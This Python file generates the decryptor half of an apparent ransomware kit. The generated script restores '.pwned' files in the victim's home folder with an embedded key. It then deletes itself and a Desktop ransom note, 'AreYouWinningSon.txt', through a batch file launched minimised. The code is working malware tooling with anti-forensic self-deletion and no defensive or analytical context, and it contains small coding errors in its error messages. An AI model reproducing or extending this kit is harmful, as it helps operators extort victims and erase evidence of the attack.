import sys

def generate_decryptor(key, output_filename):
    script = f"""
import os
import subprocess
import sys
import time
import random
from cryptography.fernet import Fernet
def unlock(key):
    fer = Fernet(key)
    user_home = os.path.expanduser("~")
    # walking
    for root, _, files in os.walk(user_home):
        for file in files:
            if file.endswith(".pwned"):
                enc_fp = os.path.join(root, file)
                dec_fp = enc_fp.rsplit(".pwned", 1)[0]
                try:
                    with open(enc_fp, "rb") as f:
                        enc_data = f.read()
                    dec_data = fer.decrypt(enc_data)
                    with open(dec_fp, "wb") as f:
                        f.write(dec_data)
                    os.remove(enc_fp)
                except Exception as e:
                    print("Error decrypting %s : %s", enc_fp, e)
def selfdestruct():
    try:
        # Identify the current script path
        script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        # Determine the path to the message file on the Desktop
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        message_file = os.path.join(desktop_path, "AreYouWinningSon.txt")
        
        batch_script = f'''
@echo off
:loop
timeout /t 1 > nul
del "{{script_path}}" > nul 2>&1
del "{{message_file}}" > nul 2>&1
if exist "{{script_path}}" goto loop
if exist "{{message_file}}" goto loop
del %0 > nul 2>&1
'''
        # Write the batch file to the same directory as the executable
        batch_file = os.path.join(os.path.dirname(script_path), "delete_me.bat")
        with open(batch_file, "w") as f:
            f.write(batch_script)
        # Execute the batch file in minimized mode
        subprocess.Popen(f'start /min {{batch_file}}', shell=True)
        print("Self-destruction scheduled successfully.")
    except Exception as e:
        print(f"Error during self-deletion setup: "+e)
if __name__ == "__main__":
    print("Don't worry, wait a little and your stuff will be as good as new.")
    time.sleep(random.randint(10, 50))
    inc = 0
    while inc < 10000001:
        inc += 1
    unlock(b"{key.decode('utf-8')}")
    selfdestruct()
    """
    with open(output_filename, "w") as f:
        f.write(script)
    print(f"Decryptor generated as: {output_filename}")

def main():
    if len(sys.argv) == 1:
        return print("Please provide the key as the argument.")
    
    key = bytes(sys.argv[1], 'utf-8')
    
    generate_decryptor(key, "decryptyourstuffbro.py")

if __name__ == "__main__":
    main()
